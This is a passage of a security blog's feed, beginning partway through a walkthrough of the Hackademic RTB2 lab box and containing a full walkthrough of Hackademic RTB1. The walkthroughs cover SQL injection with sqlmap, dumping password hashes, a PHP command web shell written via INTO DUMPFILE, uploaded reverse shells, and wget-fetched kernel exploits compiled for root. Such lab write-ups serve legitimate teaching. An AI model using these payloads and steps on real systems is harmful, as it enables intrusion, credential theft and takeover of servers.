+<p>Now we&rsquo;ve got root on the database and access to the phpMyAdmin console.  From here, we can inject a backdoor that allows us to execute commands on the backend system.  This method was taken from <a href="http://www.securitytube.net/video/937">here</a>, though it&rsquo;s not exactly new.</p>
+
+<p>First we create a new table:
+<code>
+CREATE TABLE shell(
+ Sauce TEXT
+) ENGINE = MYISaM;
+</code></p>
+
+<p>Here we&rsquo;re creating a new table, shell, with a single text field, Sauce, as a MYISaM container (<a href="http://dev.mysql.com/doc/refman/5.0/en/myisam-storage-engine.html">more here</a>).  Next we&rsquo;ll insert the actual shell interpreter into the table:</p>
+
+<p><code>
+INSERT INTO shell
+VALUES(
+'&lt;pre&gt;&lt;? @system($_REQUEST["v"]); ?&gt;&lt;/pre&gt;'
+);
+</code></p>
+
+<p>Next we&rsquo;re going to need to dump to a php file for us to actually run with.  This can be done with the INTO DUMPFILE sql command, like so:</p>
+
+<p><code>
+SELECT *
+INTO DUMPFILE '/var/www/st.php'
+FROM shell;
+</code></p>
+
+<p>How do we know to hit /var/www?  By pulling the default apache2 config file of course:</p>
+
+<p>```
+root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url &ldquo;<a href="http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1">http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1</a>&rdquo; -p &lsquo;catid&rsquo; &mdash;dbms mysql &mdash;file-read=&lsquo;/etc/apache2/sites-available/default&rsquo;
+root@bt:/pentest/database/sqlmap# cat output/192.168.1.75/files/_etc_apache2_sites-available_default
+[SNIP]
+<VirtualHost *:666></p>
+
+<pre><code>ServerAdmin webmaster@localhost
+
+DocumentRoot /var/www
+&lt;Directory /&gt;
+    Options FollowSymLinks
+    AllowOverride None
+&lt;/Directory&gt;
+&lt;Directory /var/www/&gt;
+    Options Indexes FollowSymLinks MultiViews
+    AllowOverride None
+    Order allow,deny
+    allow from all
+&lt;/Directory&gt;
+
+ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+&lt;Directory "/usr/lib/cgi-bin"&gt;
+    AllowOverride None
+    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
+    Order allow,deny
+    Allow from all
+&lt;/Directory&gt;
+
+ErrorLog /var/log/apache2/error.log
+
+# Possible values include: debug, info, notice, warn, error, crit,
+# alert, emerg.
+LogLevel warn
+
+CustomLog /var/log/apache2/access.log combined
+
+Alias /doc/ "/usr/share/doc/"
+&lt;Directory "/usr/share/doc/"&gt;
+    Options Indexes MultiViews FollowSymLinks
+    AllowOverride None
+    Order deny,allow
+    Deny from all
+    Allow from 127.0.0.0/255.0.0.0 ::1/128
+&lt;/Directory&gt;
+</code></pre>
+
+<p></VirtualHost>
+```</p>
+
+<p>Now we can execute commands on the backend:</p>
+
+<p><img src="/images/posts/2012/hrt2_6.jpg"></p>
+
+<p>As you can see, most everything in <code>/var/www/</code> is owned by root, which would explain our inability to write anywhere.  The ownership of <code>configuration.php</code> would also explain our ability to retrieve it.</p>
+
+<p>Another interesting bit was found in user p0wnbox&rsquo;s download&rsquo;s folder.  knockknock-0.7.tar.gz.</p>
+
+<p><img src="/images/posts/2012/hrt2_7.jpg"></p>
+
+<p>We can&rsquo;t yet read the configuration file (we&rsquo;re www-data), but it appears that a port knocker is running.  This is likely why I couldn&rsquo;t immediately connect to the :666 Joomla site.  Interesting.</p>
+
+<p>Let&rsquo;s drop a reverse shell onto the box the same way we did the command access.</p>
+
+<p>```
+CREATE TABLE bdshell(
+Sauce TEXT
+);</p>
+
+<p>INSERT INTO bdshell
+VALUES(INSERT INTO shell
+VALUES(
+[SNIP]
+);</p>
+
+<p>SELECT *
+INTO DUMPFILE &lsquo;/var/www/bd.php&rsquo;
+FROM bdshell;
+```</p>
+
+<p>The snipped area from the insert is just a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP reverse shell</a>, stripped of all apostrophes.  We can now connect to it like so:</p>
+
+<p><img src="/images/posts/2012/hrt2_7.jpg"></p>
+
+<p>Now we&rsquo;ve got a shell on the box as www-data.  A little enumeration&hellip;</p>
+
+<p><code>
+$ whoami
+www-data
+$ uname -a
+Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
+</code></p>
+
+<p>Huzzah,<a href="http://threatpost.com/en_us/blogs/linux-kernel-flaw-coughs-root-rights-102110">privilege</a> escalation time.  Funny enough, exactly the exploit we used for RTB1.</p>
+
+<p><code>``
+$ cd /tmp
+$ ls
+orbit-gdm
+pulse-PKdhtXMmr18n
+$ wget www.vsecurity.com/download/tools/linux-rds-exploit.c
+--2012-11-19 06:01:56--  http://www.vsecurity.com/download/tools/linux-rds-exploit.c
+Resolving www.vsecurity.com... 209.67.252.12
+Connecting to www.vsecurity.com|209.67.252.12|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6435 (6.3K) [text/x-c]
+Saving to:</code>linux-rds-exploit.c'</p>
+
+<pre><code> 0K ......                                                100% 83.6K=0.08s
+</code></pre>
+
+<p>2012-11-19 06:01:56 (83.6 KB/s) &ndash; `linux-rds-exploit.c' saved [6435/6435]</p>
+
+<p>$ ls
+linux-rds-exploit.c
+orbit-gdm
+pulse-PKdhtXMmr18n
+$ gcc linux-rds-exploit.c -o sploit
+$ ./sploit
+[<em>] Linux kernel >= 2.6.30 RDS socket exploit
+[</em>] by Dan Rosenberg
+[<em>] Resolving kernel addresses&hellip;
+ [+] Resolved rds_proto_ops to 0xe099e980
+ [+] Resolved rds_ioctl to 0xe0998090
+ [+] Resolved commit_creds to 0xc016dd80
+ [+] Resolved prepare_kernel_cred to 0xc016e0c0
+[</em>] Overwriting function pointer&hellip;
+[<em>] Linux kernel >= 2.6.30 RDS socket exploit
+[</em>] by Dan Rosenberg
+[<em>] Resolving kernel addresses&hellip;
+ [+] Resolved rds_proto_ops to 0xe099e980
+ [+] Resolved rds_ioctl to 0xe0998090
+ [+] Resolved commit_creds to 0xc016dd80
+ [+] Resolved prepare_kernel_cred to 0xc016e0c0
+[</em>] Overwriting function pointer&hellip;
+[<em>] Triggering payload&hellip;
+[</em>] Restoring function pointer&hellip;
+$ whoami
+root
+$ cd /root
+$ ls
+Desktop
+Key.txt
+```</p>
+
+<p>Bam.  Answering a question I had before,</p>
+
+<p>```
+$ cat /etc/knockd.conf
+[options]</p>
+
+<pre><code>UseSyslog
+</code></pre>
+
+<p>[openHTTPD]</p>
+
+<pre><code>sequence    = 7000,8000,9000
+seq_timeout = 5
+command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
+tcpflags    = syn
+</code></pre>
+
+<p>[closeHTTPD]</p>
+
+<pre><code>sequence    = 9000,8000,7000
+seq_timeout = 5
+command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
+tcpflags    = syn
+</code></pre>
+
+<p>```</p>
+
+<p>So we&rsquo;d need to hit 7000, then 8000, then finally 9000 to get accepted.  Fortunately a simple nmap of the box will enable this rule, so it really isn&rsquo;t a very impressive port knocking tool.</p>
+
+<p>Overall a fun disc.  And if there&rsquo;s any interest, I may pick up the Joomla attack tool and continue development of it.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Solving Hackademic-RTB1]]></title>
+    <link href="http://hatRiot.github.io/blog/2012/11/13/solving-hackademic-rtb1/"/>
+    <updated>2012-11-13T00:24:24-08:00</updated>
+    <id>http://hatRiot.github.io/blog/2012/11/13/solving-hackademic-rtb1</id>
+    <content type="html"><![CDATA[<p>Hackademic is a pseudo-realistic boot2root box that aims for realism over puzzles or steganography (or obscurity like pwn0s2..).  With that, lets start:</p>
+
+<p>The initial scan:</p>
+
+<p>```</p>
+
+<h1>Nmap 6.01 scan initiated Tue Nov 13 22:16:40 2012 as: nmap -sSV -F -T5 -oN hack.scan 192.168.1.168</h1>
+
+<p>Nmap scan report for 192.168.1.168
+Host is up (0.00028s latency).
+Not shown: 98 filtered ports
+PORT   STATE  SERVICE VERSION
+22/tcp closed ssh
+80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
+MAC Address: 08:00:27:3A:9D:2B (Cadmus Computer Systems)</p>
+
+<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .</p>
+
+<h1>Nmap done at Tue Nov 13 22:16:48 2012 &mdash; 1 IP address (1 host up) scanned in 7.87 seconds</h1>
+
+<p>```</p>
+
+<p>A &lsquo;closed&rsquo; responding ssh and an HTTP server.  Navigating to the site gives us a lovely Wordpress.  Running wpscan..</p>
+
+<p>```
+root@bt:/pentest/web/wpscan# ruby wpscan.rb &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/">http://192.168.1.168/Hackademic_RTB1/</a></p>
+
+<hr />
+
+<hr />
+
+<p> \ \        / /  <strong> \ / </strong><strong>|               <br/>
+  \ \  /\  / /| |</strong>) | (<strong><em>   </em></strong>  <strong> _ _ </strong><br/>
+   \ \/  \/ / |  <em><strong>/ _</strong> \ / __|/ </em>` | &lsquo;_ \</p>
+
+<pre><code>\  /\  /  | |     ____) | (__| (_| | | | |
+ \/  \/   |_|    |_____/ \___|\__,_|_| |_| v2.0r7491288
+
+WordPress Security Scanner by the WPScan Team
+</code></pre>
+
+<p> Sponsored by the RandomStorm Open Source Initiative</p>
+
+<hr />
+
+<p>| URL: <a href="http://192.168.1.168/Hackademic_RTB1/">http://192.168.1.168/Hackademic_RTB1/</a>
+| Started on Tue Nov 13 22:20:45 2012</p>
+
+<p>[!] The WordPress &lsquo;<a href="http://192.168.1.168/Hackademic_RTB1/readme.html">http://192.168.1.168/Hackademic_RTB1/readme.html</a>&rsquo; file exists
+[+] WordPress version 1.5.1.1 identified from meta generator</p>
+
+<p>[!] We have identified 2 vulnerabilities from the version number :</p>
+
+<p> | * Title: WordPress &lt;= 1.5.1.1 &ldquo;add new admin&rdquo; SQL Injection Exploit
+ | * Reference: <a href="http://www.exploit-db.com/exploits/1059/">http://www.exploit-db.com/exploits/1059/</a></p>
+
+<p> | * Title: WordPress &lt;= 1.5.1.1 SQL Injection Exploit
+ | * Reference: <a href="http://www.exploit-db.com/exploits/1033/">http://www.exploit-db.com/exploits/1033/</a></p>
+
+<p>[+] Enumerating plugins from passive detection &hellip;
+No plugins found :(</p>
+
+<p>[+] Finished at Tue Nov 13 22:20:45 2012
+[+] Elapsed time: 00:00:00
+root@bt:/pentest/web/wpscan#
+```</p>
+
+<p>Clearly a Wordpress, and quite clearly a very old version.  I couldn&rsquo;t get the listed add admin exploit to work, so I played around with SQLi:</p>
+
+<p><img src="/images/posts/2012/hrt_1.jpg"></p>
+
+<p>The backend appears to be running as root.  Switching over to sqlmap, we can iterate through the backend much quicker:</p>
+
+<p>```
+root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/?cat=0">http://192.168.1.168/Hackademic_RTB1/?cat=0</a> &mdash;users &mdash;passwords</p>
+
+<p>[22:29:16] [INFO] resuming back-end DBMS &lsquo;mysql&rsquo;
+[22:29:16] [INFO] testing connection to the target url
+[22:29:16] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[22:29:16] [INFO] fetching database users
+[22:29:16] [INFO] the SQL query used returns 27 entries
+database management system users [1]:
+[*] &lsquo;root&rsquo;@&lsquo;localhost&rsquo;</p>
+
+<p>[22:29:16] [INFO] fetching database users password hashes
+[22:29:17] [INFO] the SQL query used returns 1 entries
+[22:29:17] [INFO] resumed: root
+[22:29:17] [INFO] resumed: 2eaec110380126d7
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
+database management system users password hashes:
+[*] root [1]:</p>
+
+<pre><code>password hash: 2eaec110380126d7
+</code></pre>
+
+<p>[22:29:18] [INFO] fetched data logged to text files under &lsquo;/pentest/database/sqlmap/output/192.168.1.168&rsquo;</p>
+
+<p>[*] shutting down at 22:29:18</p>
+
+<p>root@bt:/pentest/database/sqlmap#
+```</p>
+
+<p>There&rsquo;s the &lsquo;mysql&rsquo; root hash, which appears to be an old style hash.  Moving forward&hellip;</p>
+
+<p>```
+root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/?cat=0">http://192.168.1.168/Hackademic_RTB1/?cat=0</a> &mdash;current-db</p>
+
+<p>[22:32:10] [INFO] resuming back-end DBMS &lsquo;mysql&rsquo;
+[22:32:10] [INFO] testing connection to the target url
+[22:32:10] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[22:32:10] [INFO] fetching current database
+[22:32:10] [INFO] resumed: wordpress
+current database:    &lsquo;wordpress&rsquo;</p>
+
+<p>[*] shutting down at 22:32:10</p>
+
+<p>root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/?cat=0">http://192.168.1.168/Hackademic_RTB1/?cat=0</a> -D wordpress &mdash;tables</p>
+
+<p>[22:33:47] [INFO] resuming back-end DBMS &lsquo;mysql&rsquo;
+[22:33:48] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[22:33:48] [INFO] fetching tables for database: &lsquo;wordpress&rsquo;
+[22:33:48] [INFO] the SQL query used returns 9 entries
+[22:33:48] [INFO] resumed: wp_categories
+[22:33:48] [INFO] resumed: wp_comments
+[22:33:48] [INFO] resumed: wp_linkcategories
+[22:33:48] [INFO] resumed: wp_links
+[22:33:48] [INFO] resumed: wp_options
+[22:33:48] [INFO] resumed: wp_post2cat
+[22:33:48] [INFO] resumed: wp_postmeta
+[22:33:48] [INFO] resumed: wp_posts
+[22:33:48] [INFO] resumed: wp_users
+Database: wordpress
+[9 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| wp_categories     |
+| wp_comments       |
+| wp_linkcategories |
+| wp_links          |
+| wp_options        |
+| wp_post2cat       |
+| wp_postmeta       |
+| wp_posts          |
+| wp_users          |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</p>
+
+<p>[*] shutting down at 22:33:48</p>
+
+<p>root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/?cat=0">http://192.168.1.168/Hackademic_RTB1/?cat=0</a> -D wordpress -T wp_users &mdash;columns
+[22:36:06] [INFO] resuming back-end DBMS &lsquo;mysql&rsquo;</p>
+
+<p>[22:36:06] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[22:36:06] [INFO] fetching columns for table &lsquo;wp_users&rsquo; in database &lsquo;wordpress&rsquo;
+[22:36:06] [WARNING] the SQL query provided does not return any output
+[22:36:06] [INFO] the SQL query used returns 22 entries
+Database: wordpress
+Table: wp_users
+[22 columns]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| Column              | Type                |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+| ID                  | bigint(20) unsigned |
+| user_activation_key | varchar(60)         |
+| user_aim            | varchar(50)         |
+| user_browser        | varchar(200)        |
+| user_description    | longtext            |
+| user_domain         | varchar(200)        |
+| user_email          | varchar(100)        |
+| user_firstname      | varchar(50)         |
+| user_icq            | int(10) unsigned    |
+| user_idmode         | varchar(20)         |
+| user_ip             | varchar(15)         |
+| user_lastname       | varchar(50)         |
+| user_level          | int(2) unsigned     |
+| user_login          | varchar(60)         |
+| user_msn            | varchar(100)        |
+| user_nicename       | varchar(50)         |
+| user_nickname       | varchar(50)         |
+| user_pass           | varchar(64)         |
+| user_registered     | datetime            |
+| user_status         | int(11)             |
+| user_url            | varchar(100)        |
+| user_yim            | varchar(50)         |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</p>
+
+<p>[*] shutting down at 22:36:06</p>
+
+<p>root@bt:/pentest/database/sqlmap# python sqlmap.py &mdash;url <a href="http://192.168.1.168/Hackademic_RTB1/?cat=0">http://192.168.1.168/Hackademic_RTB1/?cat=0</a> -D wordpress -T wp_users -C user_pass,user_login,user_level &mdash;dump</p>
+
+<p>[*] starting at 22:38:47</p>
+
+<p>[22:38:47] [INFO] resuming back-end DBMS &lsquo;mysql&rsquo;
+[22:38:47] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Fedora 13 (Goddard)
+web application technology: PHP 5.3.3, Apache 2.2.15
+back-end DBMS: MySQL 5.0
+[22:38:47] [INFO] fetching entries of column(s) &lsquo;user_level, user_login, user_pass&rsquo; for table &lsquo;wp_users&rsquo; in database &lsquo;wordpress&rsquo;
+[22:38:47] [INFO] the SQL query used returns 6 entries
+Database: wordpress
+Table: wp_users
+[6 entries]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| user_pass                        | user_login   | user_level |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| 21232f297a57a5a743894a0e4a801fc3 | NickJames    | 1          |
+| 50484c19f1afdaf3841a0d821ed393d2 | MaxBucky     | 0          |
+| 7cbb3252ba6b7e9c422fac5334d22054 | GeorgeMiller | 10         |
+| 8601f6e1028a8e8a966f6c33fcd9aec4 | JasonKonnors | 0          |
+| a6e514f9486b83cb53d8d932f9a04292 | TonyBlack    | 0          |
+| b986448f0bb9e5e124ca91d3d650f52c | JohnSmith    | 0          |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>[*] shutting down at 22:38:50</p>
+
+<p>root@bt:/pentest/database/sqlmap#
+```</p>
+
+<p>The <code>user_level</code> determines their level of access on the Wordpress, with 1 being basic and 10 being administrator.  You can guess which account we went after:</p>
+
+<p><img src="/images/posts/2012/hrt_2.jpg"></p>
+
+<p>Now we&rsquo;ve got an administrative account on the Wordpress.  It&rsquo;s a very basic, very old, Wordpress.  How can we go about getting shell access?</p>
+
+<p><img src="/images/posts/2012/hrt_3.jpg"></p>
+
+<p>By allowing file uploads, increasing the maximum size and adding to the allowable file extensions, we can upload the fantastic <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP reverse shell</a>.  Then all we need to do is open up a netcat listener and navigate to the PHP file in wp-content/&hellip;</p>
+
+<p><img src="/images/posts/2012/hrt_4.jpg"></p>
+
+<p>Now we&rsquo;ve got a shell.  Some enumeration&hellip;</p>
+
+<p><code>
+sh-4.0$ uname -a
+uname -a
+Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
+sh-4.0$ netstat -vant
+netstat -vant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address               Foreign Address             State      
+tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      
+tcp        0      0 127.0.0.1:631               0.0.0.0:*                   LISTEN      
+tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      
+tcp        0      0 192.168.1.168:47372         192.168.1.232:1234          ESTABLISHED
+tcp        0      0 :::80                       :::*                        LISTEN      
+tcp        0      0 ::1:631                     :::*                        LISTEN      
+tcp        0      0 ::ffff:192.168.1.168:80     ::ffff:192.168.1.118:54299  ESTABLISHED
+sh-4.0$ whoami
+whoami
+apache
+sh-4.0$
+</code></p>
+
+<p>Odd that MySQL is listening on 0.0.0.0, but we couldn&rsquo;t find it on a scan.  Likely iptable rules in place, but we need root first.  How&rsquo;s about a kernel <a href="http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c">privilege escalation vulnerability</a>?</p>
+
+<p><code>``
+sh-4.0$ cd /tmp                     
+cd /tmp
+sh-4.0$ wget downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+wget downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+--2012-11-14 06:52:05--  http://downloads.securityfocus.com/vulnerabilities/exploits/44219.c
+Resolving downloads.securityfocus.com... 143.127.139.111
+Connecting to downloads.securityfocus.com|143.127.139.111|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6804 (6.6K) [text/plain]
+Saving to:</code>44219.c'</p>
+
+<pre><code> 0K ......                                                100% 72.1K=0.09s
+</code></pre>
+
+<p>2012-11-14 06:52:05 (72.1 KB/s) &ndash; `44219.c' saved [6804/6804]</p>
+
+<p>sh-4.0$ gcc 44219.c -o sploit
+gcc 44219.c -o sploit
+sh-4.0$ ./sploit
+./sploit
+[<em>] Linux kernel >= 2.6.30 RDS socket exploit
+[</em>] by Dan Rosenberg
+[<em>] Resolving kernel addresses&hellip;
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[</em>] Overwriting security ops&hellip;
+[<em>] Linux kernel >= 2.6.30 RDS socket exploit
+[</em>] by Dan Rosenberg
+[<em>] Resolving kernel addresses&hellip;
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[</em>] Overwriting security ops&hellip;
+[<em>] Overwriting function pointer&hellip;
+[</em>] Linux kernel >= 2.6.30 RDS socket exploit
+[<em>] by Dan Rosenberg
+[</em>] Resolving kernel addresses&hellip;
+ [+] Resolved security_ops to 0xc0aa19ac
+ [+] Resolved default_security_ops to 0xc0955c6c
+ [+] Resolved cap_ptrace_traceme to 0xc055d9d7
+ [+] Resolved commit_creds to 0xc044e5f1
+ [+] Resolved prepare_kernel_cred to 0xc044e452
+[<em>] Overwriting security ops&hellip;
+[</em>] Overwriting function pointer&hellip;
+[<em>] Triggering payload&hellip;
+[</em>] Restoring function pointer&hellip;
+whoami
+root
+cd /root/                                                                     <br/>
+ls
+Desktop
+anaconda-ks.cfg
+key.txt
+key.txt~
+cat key.txt
+Yeah!!
+You must be proud because you &rsquo;ve got the password to complete the First <em>Realistic</em> Hackademic Challenge (Hackademic.RTB1) :)</p>
+
+<p>$<em>d&amp;jgQ>>ak#b"(Hx"o&lt;la</em>%</p>
+
+<p>Regards,
+mr.pr0n || p0wnbox.Team || 2011
+<a href="http://p0wnbox.com">http://p0wnbox.com</a>
+```</p>
+
+<p>And that&rsquo;s game!  Pretty nice box, though I must admit priv esc vulnerabilities in out of date kernels are rather boring.  Next up, Hackademic RTB2.</p>
 ]]></content>
   </entry>
   
